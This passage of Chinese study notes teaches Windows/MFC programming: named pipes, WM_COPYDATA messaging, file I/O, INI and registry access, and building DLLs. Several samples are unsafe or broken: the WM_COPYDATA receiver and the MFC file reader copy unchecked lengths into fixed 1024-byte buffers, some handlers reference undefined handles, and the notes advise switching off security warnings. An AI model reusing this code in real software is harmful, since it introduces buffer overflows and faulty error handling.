**示例：**【基于匿名管道的客户端服务端，服务端新增3个按钮，客户端新增3个按钮】在服务端可创建命名管道并等待客户端连接，然后在客户端连接匿名管道。只要不关闭命名管道，可在任意端点击发送，另一端接收。

![](W-8-4.png)

📋服务端

```c++
HANDLE hNamedPipe;

void CMFCAppmailslotserverDlg::OnBnClickedCreateNamePipe()
{
	// TODO: 在此添加控件通知处理程序代码
	//1 创建一个命名管道
	LPCTSTR szPipeName = TEXT("\\\\.\\pipe\\mypipe");
	hNamedPipe = CreateNamedPipe(szPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE, 1, 1024, 1024, 0, NULL);
	// NMPWAIT_USE_DEFAULT_WAIT = 0 // 默认超时处理

	if (hNamedPipe == INVALID_HANDLE_VALUE)
	{
		TRACE("CreateNamedhPipe failed with %d\n", GetLastError());
		//MessageBox(_T("创建命名管道失败"));
		MessageBox("创建命名管道失败");
		return;
	}
	// 2 等待客户端的连接
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (NULL == hEvent)
	{
		MessageBox("创建事件失败");
		CloseHandle(hNamedPipe);
		hNamedPipe = NULL;
		return;
	}

	// 等待hEvent事件，阻塞等待客户端连接
	OVERLAPPED ovlap;
	ZeroMemory(&ovlap, sizeof(OVERLAPPED));
	ovlap.hEvent = hEvent;
	//等待连接
	if (!ConnectNamedPipe(hNamedPipe, &ovlap))
	{
		if (ERROR_IO_PENDING != GetLastError())
		{
			MessageBox("等待客户端连接失败");
			CloseHandle(hNamedPipe);
			CloseHandle(hEvent);
			hNamedPipe = NULL;
			hEvent = NULL;
			return;
		}
	}
	
	if (WaitForSingleObject(hEvent, INFINITE) == WAIT_FAILED)
	{
		MessageBox("等待对象失败");
		CloseHandle(hNamedPipe);
		CloseHandle(hEvent);
		hNamedPipe = NULL;
		hEvent = NULL;
		return;
	}
	MessageBox("连接成功");
}


void CMFCAppmailslotserverDlg::OnBnClickedSendName()
{
	// TODO: 	命名管道发送
	char szBuf[100] = { "Named Pipe coming from Server" };
	DWORD dwWrite;
	if (!WriteFile(hNamedPipe, szBuf, strlen(szBuf) + 1, &dwWrite, NULL))
	{
		MessageBox("写入数据失败");
		CloseHandle(hWritePipe);
		return;
	}
}


void CMFCAppmailslotserverDlg::OnBnClickedRecvName()
{
	// TODO: 命名管道接收
	char szBuf[100] = { 0 };
	DWORD dwRead;//实际读到的长度
	TRACE("Begin Read:\n");
	if (!ReadFile(hNamedPipe, szBuf, 100, &dwRead, NULL))
	{
		MessageBox("Read Failed!");
		CloseHandle(hReadPipe);
		return;
	}
	//3 显示数据
	TRACE("############## dwRead = %d ########\n", dwRead);
	MessageBox(szBuf);
}
```

📋客户端

```c++
HANDLE hNamedPipe;

void CMFCAppmailslotclientDlg::OnBnClickedConnectPipe()
{
	// TODO: 在此添加控件通知处理程序代码
	LPCTSTR szNamedPipeName = TEXT("\\\\.\\pipe\\mypipe");
	//等待是否有可用的命名管道
	if (0 == WaitNamedPipe(szNamedPipeName, NMPWAIT_WAIT_FOREVER))
	{
		MessageBox("当前没有可以利用的管道");
		return;
	}
	hNamedPipe = CreateFile(szNamedPipeName, GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNamedPipe == INVALID_HANDLE_VALUE)
	{
		TRACE("CreateFile failed with %d\n", GetLastError());
		MessageBox(_T("打开命名管道失败！"));
		hNamedPipe = NULL;
		return;
	}
	MessageBox("连接成功");
}


void CMFCAppmailslotclientDlg::OnBnClickedSendNameBtn()
{
	// TODO: 命名管道发送
	char szBuf[100] = { "Named Pipe coming from client" };
	DWORD dwWrite;
	if (!WriteFile(hNamedPipe, szBuf, strlen(szBuf) + 1, &dwWrite, NULL))
	{
		MessageBox("写入数据失败");
		CloseHandle(hWritePipe);
		return;
	}
}


void CMFCAppmailslotclientDlg::OnBnClickedRecvNameBtn()
{
	// TODO: 命名管道接收
	char szBuf[100] = { 0 };
	DWORD dwRead;//实际读到的长度
	TRACE("Begin Read:\n");
	if (!ReadFile(hNamedPipe, szBuf, 100, &dwRead, NULL))
	{
		MessageBox("Read Failed!");
		CloseHandle(hReadPipe);
		return;
	}
	//3 显示数据
	TRACE("############## dwRead = %d ########\n", dwRead);
	MessageBox(szBuf);
}
```



<br>

## 8.8 进程间通信方式之`WM_COPYDATA`

`WM_COPYDATA`【WM：Windows Message】，即使用 `SendMessage`函数发送WM_COPYDATA消息。

【`WM_COPYDATA`在进程间通信用的最多】

```c++
//如果接收方应用程序处理此消息，则应返回TRUE；否则，应返回FALSE
SendMessageA(
    _In_ HWND hWnd,	//窗口句柄
    _In_ UINT Msg,	//消息类型，如WM_COPYDATA
    _Pre_maybenull_ _Post_valid_ WPARAM wParam,//传递数据的窗口的句柄
    _Pre_maybenull_ _Post_valid_ LPARAM lParam //指向COPYDATASTRUCT
);

//该结构包含要传递的数据
typedef struct tagCOPYDATASTRUCT {
  ULONG_PTR dwData;	//要传递给接收应用程序的数据类型
  DWORD     cbData;	//lpData 成员指向的数据的大小（以字节为单位）
  PVOID     lpData;	//要传递给接收应用程序的数据。 此成员可以为 NULL。
} COPYDATASTRUCT, *PCOPYDATASTRUCT;
```



<br>

🔺必备工具【`SPY++`工具】专门用来查找窗口句柄【窗口搜索，拖动指针即可获得窗口句柄】

> 要给进程发数据，首先要拿到进程的<span style="background:#5de420;">窗口句柄</span>，而窗口句柄由<span style="background:#5de420;">标题</span>查找得到。

 

**示例：**【基于命名管道的客户端服务端，服务端新增1个按钮，客户端新增1个按钮】在服务端可创建命名管道并等待客户端连接，然后在客户端连接匿名管道。只要不关闭命名管道，可在任意端点击发送，另一端接收。

![](W-8-5.png)

📋发送端【写在服务端】

```c++
void CMFCAppmailslotserverDlg::OnBnClickedSendCopydata()
{
	// TODO: COPYDATA 发送
	CString strWindowsTitle = _T("客户端");
	CString strMsg = _T("COPYDATA is coming");
	//利用标题拿到句柄
	HWND hWnd = ::FindWindow(NULL, strWindowsTitle.GetBuffer(0));

	if (hWnd != NULL && IsWindow(hWnd))
	{
		//数据的封装
		COPYDATASTRUCT cpd;
		cpd.dwData = 0;//指定数据类型
		cpd.cbData = strMsg.GetLength() * sizeof(TCHAR);//发送数据的字节长度
		cpd.lpData = (PVOID)strMsg.GetBuffer(0);
		::SendMessage(hWnd, WM_COPYDATA, (WPARAM)(AfxGetApp()->m_pMainWnd), (LPARAM)&cpd);
	}
	strWindowsTitle.ReleaseBuffer();//CString可能会内存泄漏
	strMsg.ReleaseBuffer();
}
```

 

📋接收端【写在客户端】

- 在Dialog设计页面，右击菜单选择【类向导】，在消息中查找 `WM_COPYDATA`，双击添加【即自动监测`COPYDATA`消息】
- 在自动生成的函数中编写代码

![](W-8-6.png)

```c++
//在自动生成的页面中编写代码
BOOL CMFCAppmailslotclientDlg::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct)
{
	//消息响应函数
	//解析数据
	LPCTSTR szText = (LPCTSTR)(pCopyDataStruct->lpData);
	DWORD dwLength = (DWORD)pCopyDataStruct->cbData;
	TCHAR szRecvText[1024] = { 0 };
	memcpy(szRecvText, szText, dwLength);
	MessageBox(szRecvText, _T("Bingo"), MB_OK);//BOX的窗口名为Bingo

	return CDialogEx::OnCopyData(pWnd, pCopyDataStruct);
}

```



<br>

## 8.9 进程间通信方式的比较

- 剪贴板比较简单；剪切板和匿名管道只能实现同一机器的两个进程通信，而不能实现网络进程之间的通信。

- 邮槽是基于广播的，可以一对多发送；但只能一个发送，一个接收，要想同时发送接收，须各创建一次邮槽。邮槽的缺点传输的数据量很小 424字节以下。

- 命名管道和邮槽可以进行网络通信；命名管道只能是点对点的单一通信。

- `WM_COPY_DATA` 封装数据和解析数据，非常方便。但如果数据量大，建议用命名管道。

 

<br>

# 九 文件操作

日志、操作配置文件【`ini`】、注册表、音视频的文件存储；而且，`Linux`下一切皆文件！

## 9.1 C/C++操作文件

### 9.1.1 C语言操作文件

第一步：打开文件

```c
_ACRTIMP FILE* __cdecl fopen(
    _In_z_ char const* _FileName,
    _In_z_ char const* _Mode
    );

_ACRTIMP errno_t __cdecl fopen_s(
    _Outptr_result_nullonfailure_ FILE**      _Stream,
    _In_z_                        char const* _FileName,
    _In_z_                        char const* _Mode
    );
```



下表列出了文件打开的模式：

| 文件打开模式 |                             意义                             |
| :----------: | :----------------------------------------------------------: |
|      r       | 【只读】为读取而打开，如果文件不存在或不能找到，函数调用失败 |
|      w       | 【重新写】为写入操作打开一个空文件。如果给定的文件已经存在，那么它的内容将被消空 |
|      a       | 【追加】为写入操作打开文件。如果文件已经存在，那么在该文件尾部添加新数据，在写入新的数之前，不会移除文件中已有的EOF标记；如果文件不存在，那么首先创建这个文件 |
|      r+      |        【文件必须存在】打开文件用于写入操作和读取操作        |
|      w+      | 为写入操作和读取操作打开一个空的文件。如果给定文件已经存在，那么它的内容将被清空 |
|      a+      | 打开文件用于读取操作和添加操作。并且，添加操作在添加新数据之前会移除该文件中已有的 EOF标记，然后当写入操作完成之后再恢复EOF标记。如果指定文件不存在，那么首先将创建这个文件 |

 

写文件 | 读文件 | 确定文件偏移量：

```c
 _ACRTIMP size_t __cdecl fwrite(
     _In_reads_bytes_(_ElementSize * _ElementCount) void const* _Buffer,
     //元素大小【如字符串的元素是char，大小为1】
     _In_                                           size_t      _ElementSize,
     _In_                                           size_t      _ElementCount,
     _Inout_                                        FILE*       _Stream
     );

//返回值表示当前读文件到缓冲区的大小
_ACRTIMP size_t __cdecl fread(
    _Out_writes_bytes_(_ElementSize * _ElementCount) void*  _Buffer,
    _In_                                             size_t _ElementSize,
    _In_                                             size_t _ElementCount,
    _Inout_                                          FILE*  _Stream
    );


// 用于移动文件内部的位置指针【成功返回0】
_ACRTIMP int __cdecl fseek(
    _Inout_ FILE* _Stream,//指向FILE结构体指针
    _In_    long  _Offset,//偏移量，表示从指定的起始位置开始移动的字节数
    _In_    int   _Origin //起始位置
    );
/* Seek method constants */
#define SEEK_CUR    1 //从当前位置开始计算偏移量
#define SEEK_END    2 //从文件末尾开始计算偏移量
#define SEEK_SET    0 //从文件开头开始计算偏移量

//返回文件指针的当前位置
_ACRTIMP long __cdecl ftell(
    _Inout_ FILE* _Stream
    );
```



📋C语言读写示例：

```c++
void CMFCFileDlg::OnBnClickedWriteFile()
{
	//1 C写文件【此处没有使用安全函数fopen_s,需要添加编译宏 | 或在所有选项中禁用4996】
	FILE* pFile = fopen("1.txt", "w");//w:重写
	if (pFile == NULL)
	{
		MessageBox("文件打开失败!");
		return;
	}
	char szBuf[1024] = "C语言操作";
	int iLen = strlen(szBuf) + 1;
	if (fwrite(szBuf, 1, iLen, pFile) <= 0)
	{
		MessageBox("文件写入失败!");
		return;
	}
	fclose(pFile);
}


void CMFCFileDlg::OnBnClickedReadFile2()
{
	//1 C读文件
	FILE* pFile = fopen("1.txt", "r");//r:只读
	if (pFile == NULL)
	{
		MessageBox("文件打开失败!");
		return;
	}
	char szBuf[1024] = "";
	//int iLen=fread(szBuf, 1, 1024, pFile);//此处的1024只是猜测，使用fseek确定

	//用于移动文件内部的位置指针
	fseek(pFile, 0, SEEK_END);//从起始到结尾的偏移量
	//得到文件当前位置
	int iFileLen = ftell(pFile);
	//在将文件内部指针设置会文件开始
	fseek(pFile, 0, SEEK_SET);
	//返回值表示当前读文件到缓冲区的大小，可能读多次
	int iLen = fread(szBuf, 1, iFileLen, pFile);

	fclose(pFile);
	MessageBox(szBuf);
}
```



<br>

### 9.1.2 C++操作文件

C++文件流是用于进行文件读写操作的工具，它提供了一种能够简单、高效地与外部文件进行交互的方式。C++中文件流主要通过`ofstream`和`ifstream`来实现对文件的写入和读取。

```c++
#include <fstream>

//创建ofstream对象
std::ofstream outputFile;

//打开文件并写入内容
outputFile.open("example.txt"); // 打开名为example.txt的文件进行写入

if (outputFile.is_open()) {
    outputFile << "Hello, World!" << std::endl; // 将字符串写入文件
    outputFile << "This is a sample text." << std::endl;
} else {
    std::cout << "Failed to open the file." << std::endl; // 如果文件打开失败，输出错误信息
}
outputFile.close(); // 关闭文件流

```



```c++
// open函数
void open(const char *filename, ios::openmode mode);
//第一参数指定要打开的文件的名称和位置
//第二个参数定义文件被打开的模式
//ios::app （append）追加模式。所有写入都追加到文件末尾
//ios::ate （at end）文件打开后定位到文件末尾
//ios::in 打开文件用于读取
//ios::out 打开文件用于写入
//ios::trunc（truncate）如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。
```



<br>

📋C++读写示例：

```c++
void CMFCFileDlg::OnBnClickedWriteFile2()
{
	// C++ 写文件
	std::ofstream  ofs("2.txt");
    
    //USES_CONVERSION;
    //CString* strBuf = A2W(pBuf);
	char szBuf[1024] = "C++语言操作";
    
	ofs.write(szBuf, strlen(szBuf));
	ofs.close();
}


void CMFCFileDlg::OnBnClickedReadFile2()
{
	// C++ 读文件
	std::ifstream  ifs("2.txt");
	char szBuf[1024] = "";
    
	ifs.read(szBuf, 1024);
	ifs.close();
	MessageBox(szBuf);
}
```

 

<br>

### 9.1.3 Win32 API

`CreateFile`：文件、管道、油槽、通信资源、磁盘设备、控制台、目录

```c++
//对C语言的封装
HANDLE CreateFileW(
  [in]           LPCWSTR               lpFileName,//创建或打开的对象的名称
  [in]           DWORD                 dwDesiredAccess,//访问方式 读，读-写 写 查询
  [in]           DWORD                 dwShareMode,//共享方式 0|NULL
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,//默认NULL 不能被子进程继承
  [in]           DWORD                 dwCreationDisposition,//如何创建文件 CREATE_NEW CREATE_ALWAYS 
  [in]           DWORD                 dwFlagsAndAttributes,//设置文件的属性和标志
  [in, optional] HANDLE                hTemplateFile//默认NULL
);

// dwDesiredAccess
#define GENERIC_READ                     (0x80000000L)
#define GENERIC_WRITE                    (0x40000000L)
#define GENERIC_EXECUTE                  (0x20000000L)
#define GENERIC_ALL                      (0x10000000L)


BOOL WriteFile(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,//要写入的字节数
    LPDWORD      lpNumberOfBytesWritten, //用来接收实际写入到文件的字节数
    LPOVERLAPPED lpOverlapped
);

WINBASEAPI
BOOL
WINAPI
WriteFile(
    _In_         HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_         DWORD nNumberOfBytesToWrite,//要写入的字节数
    _Out_opt_    LPDWORD lpNumberOfBytesWritten,//用来接收实际写入到文件的字节数
    _Inout_opt_  LPOVERLAPPED lpOverlapped		//默认NULL
    );
```

 

📋Windows API读写示例：

```c++
void CMFCFileDlg::OnBnClickedWriteFileWin()
{
	// WIN32写文件 dwCreationDisposition = CREATE_NEW | OPEN_EXISTING ...
	HANDLE hFile = CreateFile("3.txt", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//此处可能因为文件已经存在而创建失败
		TRACE("### error = %d ####", GetLastError());
		MessageBox("创建文件对象失败!");
		return;
	}
	//写文件
	char szBuf[1024] = "Win32操作文件---";
	DWORD dwWrite;
	WriteFile(hFile, szBuf, strlen(szBuf), &dwWrite, NULL);

	TRACE("### dwWrite = %d ####", dwWrite);
	CloseHandle(hFile);
}


void CMFCFileDlg::OnBnClickedReadFileWin()
{
	// WIN32读文件
	HANDLE hFile = CreateFile("3.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		TRACE("### error = %d ####", GetLastError());
		MessageBox("创建文件对象失败!");
		return;
	}
	//读文件
	DWORD dwRead;
	char szBuf[1024] = "";
	ReadFile(hFile, szBuf, 1024, &dwRead, NULL);
	TRACE("### dwRead = %d ####", dwRead);
	CloseHandle(hFile);
	MessageBox(szBuf);
}
```

 <br>

### 9.1.4 MFC操作文件

📋MFC读写示例：【类似C++】

```c++
void CMFCFileDlg::OnBnClickedWriteFileMfc()
{
	// MFC写文件
	CFile file("4.txt", CFile::modeCreate | CFile::modeWrite);
	char szBuf[1024] = "MFC文件操作";
	file.Write(szBuf, strlen(szBuf));
	file.Close();
}


void CMFCFileDlg::OnBnClickedReadFileMfc()
{
	// MFC读文件
	/*CFile file("4.txt",  CFile::modeRead);
	char szBuf[1024] = "";
	file.Read(szBuf, 1024);
	file.Close();
	MessageBox(szBuf);*/

	// MFC读文件[高级操作]:对话框选择
	CFileDialog fileDlg(TRUE);
	fileDlg.m_ofn.lpstrTitle = "Test";//标签
	fileDlg.m_ofn.lpstrFilter = "Text Files(*.txt)\0*.txt\0ALL Files(*.*)\0*.*\0\0";//过滤器

	DWORD dwFileLen;

	if (IDOK == fileDlg.DoModal())
	{
		CFile file(fileDlg.GetFileName(), CFile::modeRead);//打开任何文件
		dwFileLen = file.GetLength();
		char szBuf[1024] = "";
		//file.Read(szBuf, 1024);
		file.Read(szBuf, dwFileLen);
		file.Close();
		MessageBox(szBuf);
	}
}
```

![](W-9-1.png)



 <br>

## 9.2 配置文件的访问与读写

`ini`的配置文件有一定的格式，如键值对。

```c++
//写配置文件【如果函数成功将字符串复制到初始化文件，则返回值为非零；失败返回0】
BOOL WritePrivateProfileStringW(
  [in] LPCWSTR lpAppName,//将字符串复制到的节的名称。 如果该节不存在，则会创建它。 节的名称与大小写无关;字符串可以是大小写字母的任意组合。
  [in] LPCWSTR lpKeyName,//要与字符串关联的键的名称。 如果指定节中不存在该键，则会创建它。 如果此参数 NULL，则会删除整个节（包括节中的所有条目）。
  [in] LPCWSTR lpString,//要写入文件的 null终止字符串。 如果此参数 NULL，则删除 lpKeyName 参数指向的键。
  [in] LPCWSTR lpFileName//如果文件已存在并且由 Unicode 字符组成，则函数会将 Unicode 字符写入文件。 否则，该函数将写入 ANSI 字符。
);

//读配置文件
DWORD
WINAPI
GetPrivateProfileStringW(
    _In_opt_ LPCWSTR lpAppName,
    _In_opt_ LPCWSTR lpKeyName,
    _In_opt_ LPCWSTR lpDefault,
    _Out_writes_to_opt_(nSize, return + 1) LPWSTR lpReturnedString,//目标Buffer
    _In_     DWORD nSize,
    _In_opt_ LPCWSTR lpFileName
    );
```





```c++
void CMFCFileDlg::OnBnClickedWriteFileIni()
{
	// 写配置文件
	char szPath[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH, szPath);//拿到当前路径

	CString szPathFile;
	szPathFile.Format("%s\\Test.ini",szPath);//字符串拼接
	//处理可能的字符集问题
	/*char szMyPath[MAX_PATH] = { 0 };
	sprintf(szMyPath, "%s\\Test.ini", szPath);*/

	WritePrivateProfileString("国家","中国","ZH", szPathFile);
	WritePrivateProfileString("国家", "美国", "USA", szPathFile);
	WritePrivateProfileString("国家", "俄罗斯", "RUS", szPathFile);
	WritePrivateProfileString("地区", "天津", "T", szPathFile);


	////获取当前路径
	//WCHAR strPath[MAX_PATH] = { 0 };
	//GetCurrentDirectoryW(MAX_PATH, strPath);
	//TRACE("##strPath = %ls", strPath);
	////  当前路径 D:\Users\82835\source\repos\MyMFCFile\ + Test.ini
	//CString strFilePath2;
	//strFilePath2.Format(L"%ls//Test.ini", strPath);//UNICODE下
	//WritePrivateProfileStringW(L"metadata", L"title", L"搜狗双拼", strFilePath2);
	//WritePrivateProfileStringW(L"声母", L"ch", L"I", strFilePath2);
	//WritePrivateProfileStringW(L"声母", L"sh", L"U", strFilePath2);

}


void CMFCFileDlg::OnBnClickedReadFileIni()
{
	// 读配置文件
	char szPath[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH, szPath);//拿到当前路径

	CString szPathFile;
	szPathFile.Format("%s\\Test.ini", szPath);//字符串拼接

	char str1[1024] = { 0 };
	char str2[1024] = { 0 };
	char str3[1024] = { 0 };
	char str4[1024] = { 0 };
	DWORD dwNum1 = GetPrivateProfileString("国家", "中国", NULL, str1,1024,szPathFile);
	DWORD dwNum2 = GetPrivateProfileString("国家", "美国", NULL, str2, 1024, szPathFile);
	DWORD dwNum3 = GetPrivateProfileString("国家", "俄罗斯", NULL, str3, 1024, szPathFile);
	DWORD dwNum4 = GetPrivateProfileString("地区", "天津", NULL, str4, 1024, szPathFile);

	CString  strShow;
	strShow.Format("中国 = %s\n美国 = %s\n俄罗斯 = %s\n天津 = %s", str1, str2, str3, str4);
	MessageBox(strShow);
}


//可参考的读配置文件【UNICODE】
void CMyMFCFileView::OnReadConfig()
{
	//获取当前路径
	WCHAR strPath[MAX_PATH] = { 0 };
	WCHAR strTitle[MAX_PATH] = { 0 };
	WCHAR strCh[MAX_PATH] = { 0 };
	WCHAR strSh[MAX_PATH] = { 0 };
	GetCurrentDirectoryW(MAX_PATH, strPath);
	TRACE("##strPath = %ls", strPath);
	//  当前路径 D:\Users\82835\source\repos\MyMFCFile\ + Test.ini
	CString strFilePath;
	strFilePath.Format(L"%ls//Test.ini", strPath);

	DWORD dwNum1 = GetPrivateProfileStringW(L"metadata", L"title",NULL,
		strTitle, MAX_PATH, strFilePath);

	DWORD dwNum2 = GetPrivateProfileStringW(L"声母", L"ch", NULL,
		strCh, MAX_PATH, strFilePath);

	DWORD dwNum3 = GetPrivateProfileStringW(L"声母", L"sh", NULL,
		strSh, MAX_PATH, strFilePath);

	TRACE("####dwNum1 = %d, dwNum2 = %d, dwNum3 = %d", dwNum1, dwNum2, dwNum3);
	 	USES_CONVERSION;
  	char* szTitle = W2A(strTitle);
	char* szCh= W2A(strCh);
	char* szSh = W2A(strSh);
	TRACE("####strTitle = %s, strCh = %s, strSh = %s", szTitle, szCh, szSh);
}

```



<br>

## 9.3 注册表编程

### 9.3.1 注册表API 

> 注册表操作需要操作系统权限，需要退出VS，再使用管理员权限打开
>
> 注册表：Win+ R组合键 ：regedit

注册表存储在二进制文件里面，`win32` API提供了大量函数来操作注册表。常用的注册表`API`如下：

```c++
//创建注册表【创建新的】
//如果函数成功，则返回值为 ERROR_SUCCESS;
//如果函数失败，则返回值为 Winerror.h 中定义的非零错误代码
WINADVAPI	//__declspec(dllimport)
LSTATUS		//LONG
APIENTRY	//WINAPI
RegCreateKeyW(
    _In_ HKEY hKey,   	//打开的当前项的句柄，实际上就是那几个分支
    _In_opt_ LPCWSTR lpSubKey,//打开或者创建的表项的名称
    _Out_ PHKEY phkResult   //用来接收创建或者打开表项句柄 regclosekey
);

//打开注册表【打开已存在的】【参数与创建注册表函数一致】
RegOpenKeyW(
    _In_ HKEY hKey,   //打开的当前项的句柄 实际上就是那几个分支
    _In_opt_ LPCWSTR lpSubKey,
    _Out_ PHKEY phkResult
);

//写入注册表
RegSetValueW(
    _In_ HKEY hKey,       //打开的当前项的句柄 实际上就是那几个分支
    _In_opt_ LPCWSTR lpSubKey,  //打开或者创建的表项的名称
    _In_ DWORD dwType,   //指示被存储信息的类型 REG_SZ类型
    _In_reads_bytes_opt_(cbData) LPCWSTR lpData,//要存放到注册表里面的数据
    _In_ DWORD cbData //要存放的字符串数据的大小、长度
);
//写入注册表【扩展版本】
RegSetValueExW(
    _In_ HKEY hKey,     //打开的当前项的句柄 实际上就是那几个分支
    _In_opt_ LPCWSTR lpValueName, 	//指向一个字符串的指针，包含了将要设置值的名称
    _Reserved_ DWORD Reserved,		//保留参数 0 | NULL
    _In_ DWORD dwType,				//REG_BINARY | REG_SZ 等等
    _In_reads_bytes_opt_(cbData) CONST BYTE * lpData,//强转后的数据指针
    _In_ DWORD cbData				//大小【单位字节】
);

//查询注册表【读】
LSTATUS RegQueryValueExA(
  [in]                HKEY    hKey,
  [in, optional]      LPCSTR  lpValueName,
                      LPDWORD lpReserved,
  [out, optional]     LPDWORD lpType,
  [out, optional]     LPBYTE  lpData,
  [in, out, optional] LPDWORD lpcbData
);

//关闭注册表
LSTATUS RegCloseKey(
  [in] HKEY hKey
);
```



<br>

### 9.3.2 注册表读写

```c++
void CMFCFileDlg::OnBnClickedWriteFileReg()
{
	// 写注册表
	HKEY hKey;
	DWORD dwWeight=56;
	//创建注册表
	DWORD dwRet = RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\MYWEIGHT\\admin",&hKey);
	if (dwRet != ERROR_SUCCESS)
	{
		MessageBox("创建注册表失败");
		return;
	}
	//写注册表【sizeof(DWORD) = sizeof(LONG) = 4】
	dwRet = RegSetValueEx(hKey, "weight", NULL, REG_DWORD, (const BYTE*)&dwWeight, sizeof(DWORD));
	if (dwRet != ERROR_SUCCESS)
	{
		MessageBox("写注册表失败");
		return;
	}
	//关闭注册表
	RegCloseKey(hKey);
}


void CMFCFileDlg::OnBnClickedReadFileReg()
{
	// 读注册表
	//1 打开注册表
	HKEY hKey;
	DWORD dwRet = ::RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\MYWEIGHT\\admin", &hKey);
	if (dwRet != ERROR_SUCCESS)
	{
		MessageBox("打开注册表失败");
		return;
	}
	//2 读注册表
	DWORD dwWeight;
	DWORD dwType;
	DWORD dwSize;
	dwRet = ::RegQueryValueEx(hKey, "weight", NULL, &dwType, (BYTE*) & dwWeight, &dwSize);
	if (dwRet != ERROR_SUCCESS)
	{
		MessageBox("读注册表失败");
		return;
	}
	//关闭注册表
	::RegCloseKey(hKey);

	CString strShow;
	strShow.Format("Weight = %d", dwWeight);
	MessageBox(strShow);
}
```



<br>

## 9.4 文件操作的企业级应用

1. 调试日志【debugview  文件日志：警告日志  错误日志】  5星
2. 视频存储    4星
3. 文件传输【CFile  与socket结合使用】  4星
4. C语言和MFC的文件操作用途广泛；`win32 API`少用  ifstream ofstream 3星
5. 配置文件【windows】  5星
6. 注册表的操作【病毒  逆向  操作注册表】5星



<br>

# 十 动态链接库

## 10.1 DLL技术的概念和意义

动态链接库技术【Dynamic-link library，DLL】是模块化开发中的一种非常重要的技术，主要特点是动态的完成库的链接与使用。

整个Windows操作系统使用了大量的动态链接库，如：

- gdi32.dl    绘图
- user32.dll    用户界面有关的函数
- kernel32.dll  内存，线程，进程
- d3d9x_11.dll绘图

**静态库和动态库的区别：**

1. 静态链接库在基础课提到过【函数提高3.8：封装自己的SDK】，是程序编译时完成链接，且库的二进制代码包含在项目代码中；
2. 而动态链接库，用于模块化编程，是在程序运行时完成链接。即在代码运行时，动态加载动态库。

**DLL技术的意义：**

- 模块化
- 方便更新送代：只需要变更动态库版本
- 提高代码共享与利用率
- 节约内存：动态库不一定被调用；且动态库被调用多次时，内存中只存在一份
- 本地化支持：相当于切换不同的动态链接库，如中文包和英文包
- 跨语言编程：如与JAVA结合
- 解决版本问题：在不同操作系统下，调用相应版本的动态库即可
- 特别作用：在制作外挂时，强制给程序新增功能，即强制链接动态库



<br>

## 10.2 创建一个动态链接库

VS新建项目，在【C++ | Windows】下，有动态链接库的选项，创建项目。本质上就一个核心文件`dllmain.cpp`：

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

//入口点函数   APIENTRY：__stdcall
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//提供一个求平均的功能【实际上，并不知道有这个函数，故需要做导出】
//int ave(int a, int b)
//{
//    return (a + b) / 2;
//}
// 将ave函数加入DLL导出表
//默认按C++的方式命名函数【C++有重载，故会在函数名中添加很多标志】如：ave@@YYN
_declspec(dllexport) int ave(int a, int b)
{
    return (a + b) / 2;
}

//按C的方式命名函数
extern "C" _declspec(dllexport) int ave1(int a, int b)
{
    return (a + b) / 2;
}

//强制为_stdcall的调用方式，这样也会自动修改函数名，如ave2@8
extern "C" _declspec(dllexport) int _stdcall ave2(int a, int b)
{
    return (a + b) / 2;
}
```

其他文件：

```c++
//mdll.h
#pragma once
//给使用者看的 | 或者创建def文件【项目|添加|代码：模块定义文件def】
_declspec(dllexport) int ave(int a, int b);


//Source.def
LIBRARY

EXPORTS
	ave
```



<br>

## 10.3 调用动态链接库

```C++
#include <iostream>
#include <Windows.h>
typedef int (*FAVE_1)(int a, int b);

int main()
{
	HMODULE hMod = LoadLibrary(L"WinDLL.exe");
	if (hMod)
	{
		std::cout << "模块加载成功" << std::endl;
	}
	else
	{
		std::cout << "模块加载失败" << std::endl;
		return -1;
	}
	FAVE_1 func1 = (FAVE_1)GetProcAddress(hMod, "ave1");//返回函数指针
	if (func1)
	{
		std::cout << "函数加载成功" << std::endl;
		std::cout << func1(2, 6) << std::endl;
	}
	FreeLibrary(hMod);

	system("pause");
	return 0;
}

```

<br>

# 十一 报错处理、调试方法及其他

## 11.1 C4996

 遇到过的C4996：

```c++
//4.2节
error C4996: 'localtime': This function or variable may be unsafe. Consider using localtime_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.

error C4996: 'sprintf': This function or variable may be unsafe. Consider using sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
```

解决：头文件添加`#pragma warning(disable:4996)`就可以解决。参考

**原因分析：**

  创建项目时，会有一个勾选项，叫做“安全开发生命周期（SDL）检查”，这个东西是微软在VS2012新推出的东西，为了是能更好的监管开发者的代码安全，如果勾选上这一项，那么他将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译，比如在VS2010中的scanf是warning那么在VS2012中就是error了。

> 有一种说法：出现`error C4996`的问题，是因为用的是windows系统，在linux下不会报错。

 **解决方案：**

1. 头文件添加 `#pragma warning(disable:4996)`
